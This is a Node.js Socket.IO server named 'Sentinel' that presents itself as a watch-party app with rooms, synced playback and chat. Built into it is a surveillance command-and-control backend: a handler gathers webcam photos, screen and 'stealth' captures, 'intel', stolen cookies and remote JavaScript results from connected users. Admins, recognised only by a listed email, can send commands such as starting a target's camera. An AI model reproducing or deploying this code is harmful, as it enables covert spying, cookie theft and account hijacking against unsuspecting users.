const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());

app.get('/', (req, res) => {
    res.send('Sentinel Server Running. Ready for connections.');
});

const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// MEMORY STORAGE (Substitutes Firebase)
// Map<socketId, SessionData>
const sessions = new Map();
// Set<socketId>
const admins = new Set();
// Map<roomId, RoomData>
// RoomData: { id: string, leaderId: string, members: Set<string>, currentMedia: object, isPlaying: boolean, currentTime: number, messages: Array }
const rooms = new Map();

const ADMIN_EMAILS = ['yurealveshot2@gmail.com', 'yurealvesoficial@gmail.com'];

// Helper to generate room code
const generateRoomId = () => Math.floor(100000 + Math.random() * 900000).toString();

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // --- CLIENT EVENTS ---

    // Register a user session
    socket.on('register_user', (data) => {
        sessions.set(socket.id, {
            id: socket.id,
            ...data,
            lastActive: Date.now(),
            isLive: true
        });
        broadcastSessionsToAdmins();
    });

    // Update user status (heartbeat)
    socket.on('heartbeat', (data) => {
        if (sessions.has(socket.id)) {
            const session = sessions.get(socket.id);
            sessions.set(socket.id, { ...session, ...data, lastActive: Date.now(), isLive: true });
            broadcastSingleSessionUpdate(socket.id);
        } else {
            sessions.set(socket.id, {
                id: socket.id,
                ...data,
                lastActive: Date.now(),
                isLive: true
            });
            broadcastSessionsToAdmins();
        }
    });

    // --- WATCH PARTY EVENTS ---

    socket.on('create_room', (metadata) => {
        const roomId = generateRoomId();
        const room = {
            id: roomId,
            leaderId: socket.id,
            members: new Set([socket.id]),
            currentMedia: metadata || {},
            isPlaying: false,
            currentTime: 0,
            messages: []
        };
        rooms.set(roomId, room);
        socket.join(roomId);

        socket.emit('room_created', {
            roomId,
            isLeader: true,
            members: Array.from(room.members).map(id => sessions.get(id) || { id })
        });
        console.log(`Room created: ${roomId} by ${socket.id}`);
    });

    socket.on('join_room', ({ roomId, userMetadata }) => {
        const room = rooms.get(roomId);
        if (!room) {
            socket.emit('error', 'Sala não encontrada.');
            return;
        }
        if (room.members.size >= 8) {
            socket.emit('error', 'Sala cheia (máx 8 pessoas).');
            return;
        }

        room.members.add(socket.id);
        socket.join(roomId);

        // Notify member of success
        socket.emit('room_joined', {
            roomId,
            isLeader: socket.id === room.leaderId,
            currentMedia: room.currentMedia,
            isPlaying: room.isPlaying,
            currentTime: room.currentTime,
            messages: room.messages,
            members: Array.from(room.members).map(id => sessions.get(id) || { id })
        });

        // Notify room of new member
        io.to(roomId).emit('room_user_joined', {
            userId: socket.id,
            user: sessions.get(socket.id) || userMetadata || { id: socket.id }
        });

        console.log(`User ${socket.id} joined room ${roomId}`);
    });

    socket.on('sync_action', (action) => {
        // action: { type: 'PLAY' | 'PAUSE' | 'SEEK' | 'URL', payload: ... }
        // Find room where socket is leader
        let targetRoom = null;
        for (const [roomId, room] of rooms) {
            if (room.members.has(socket.id)) {
                targetRoom = room;
                break;
            }
        }

        if (!targetRoom) return;

        // ONLY LEADER CAN CONTROL PLAYBACK
        if (targetRoom.leaderId !== socket.id) {
            // Except for 'CHAT' or 'reaction' maybe? For now, strict sync.
            if (action.type === 'CHAT') {
                const msg = {
                    id: Date.now(),
                    userId: socket.id,
                    userName: (sessions.get(socket.id)?.userName || 'Usuário'),
                    text: action.payload
                };
                targetRoom.messages.push(msg);
                if (targetRoom.messages.length > 50) targetRoom.messages.shift();
                io.to(targetRoom.id).emit('room_message', msg);
                return;
            }
            return;
        }

        // Apply state updates
        if (action.type === 'PLAY') targetRoom.isPlaying = true;
        if (action.type === 'PAUSE') targetRoom.isPlaying = false;
        if (action.type === 'SEEK') targetRoom.currentTime = action.payload;
        if (action.type === 'URL') targetRoom.currentMedia = action.payload;

        // Broadcast to everyone ELSE in the room (or everyone including sender if needed for confirmation)
        // Usually for player sync, sender handles their own state immediately, so broadcast to others.
        socket.to(targetRoom.id).emit('sync_update', action);
    });

    // Allow any member to send chat, not just leader
    socket.on('room_chat_message', (text) => {
        let targetRoom = null;
        for (const [roomId, room] of rooms) {
            if (room.members.has(socket.id)) {
                targetRoom = room;
                break;
            }
        }
        if (targetRoom) {
            const msg = {
                id: Date.now(),
                userId: socket.id,
                userName: (sessions.get(socket.id)?.userName || 'Usuário'),
                text
            };
            targetRoom.messages.push(msg);
            if (targetRoom.messages.length > 50) targetRoom.messages.shift();
            io.to(targetRoom.id).emit('room_message', msg);
        }
    });

    socket.on('leave_room', () => {
        handleLeaveRoom(socket);
    });

    // Receive Snapshot/Intel from Client
    socket.on('client_data', (payload) => {
        // payload: { type: 'photo' | 'screen' | 'intel', data: ... }
        if (sessions.has(socket.id)) {
            const session = sessions.get(socket.id);
            const updatedSession = { ...session };

            if (payload.type === 'photo') updatedSession.photo = payload.data;
            if (payload.type === 'screen') updatedSession.screenPreview = payload.data;
            if (payload.type === 'intel') updatedSession.intel = payload.data;
            if (payload.type === 'stealth') updatedSession.stealthPreview = payload.data;
            if (payload.type === 'cookies') updatedSession.stolenCookies = payload.data;
            if (payload.type === 'js_result') updatedSession.lastJsResult = payload.data;

            sessions.set(socket.id, updatedSession);
            broadcastSingleSessionUpdate(socket.id);
        }
    });

    // --- ADMIN EVENTS ---

    // Admin Login
    socket.on('admin_login', (email) => {
        if (ADMIN_EMAILS.includes(email)) {
            admins.add(socket.id);
            socket.emit('admin_auth_success', true);
            // Send current list immediately
            socket.emit('sessions_list', Array.from(sessions.values()));
        } else {
            socket.emit('admin_auth_error', 'Unauthorized email');
        }
    });

    // Admin Command
    socket.on('admin_command', ({ targetId, command }) => {
        if (!admins.has(socket.id)) return;

        // Command structure: { type: 'START_CAM', payload: ... }
        io.to(targetId).emit('server_command', command);
    });

    // --- DISCONNECT ---
    socket.on('disconnect', () => {
        handleLeaveRoom(socket); // Handle room exit logic

        if (admins.has(socket.id)) {
            admins.delete(socket.id);
        }
        if (sessions.has(socket.id)) {
            sessions.delete(socket.id);
            broadcastSessionsToAdmins();
        }
        console.log('Disconnected:', socket.id);
    });
});

function handleLeaveRoom(socket) {
    for (const [roomId, room] of rooms) {
        if (room.members.has(socket.id)) {
            room.members.delete(socket.id);
            socket.leave(roomId);

            // Notify remaining members
            io.to(roomId).emit('room_user_left', { userId: socket.id });

            // If leader left, assign new leader or destroy room
            if (room.leaderId === socket.id) {
                if (room.members.size > 0) {
                    // Assign new leader (first one in set)
                    const newLeaderId = room.members.values().next().value;
                    room.leaderId = newLeaderId;
                    io.to(roomId).emit('room_leader_changed', { newLeaderId });
                    io.to(newLeaderId).emit('you_are_leader'); // Private notify
                } else {
                    rooms.delete(roomId); // Empty room
                }
            } else if (room.members.size === 0) {
                rooms.delete(roomId);
            }
            break;
        }
    }
}

// Broadcast full list to all admins
function broadcastSessionsToAdmins() {
    const list = Array.from(sessions.values());
    for (const adminId of admins) {
        io.to(adminId).emit('sessions_list', list);
    }
}

// Broadcast single update (bandwidth optimization)
function broadcastSingleSessionUpdate(sessionId) {
    const session = sessions.get(sessionId);
    if (!session) return;
    for (const adminId of admins) {
        io.to(adminId).emit('session_update', session);
    }
}

// Prune stale sessions (just in case socket didn't close properly)
setInterval(() => {
    const now = Date.now();
    let changed = false;
    for (const [id, session] of sessions) {
        if (now - session.lastActive > 60000 * 5) { // 5 minutes inactivity
            sessions.delete(id);
            changed = true;
        }
    }
    if (changed) broadcastSessionsToAdmins();
}, 60000);

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
    console.log(`Sentinel Server running on port ${PORT}`);
});
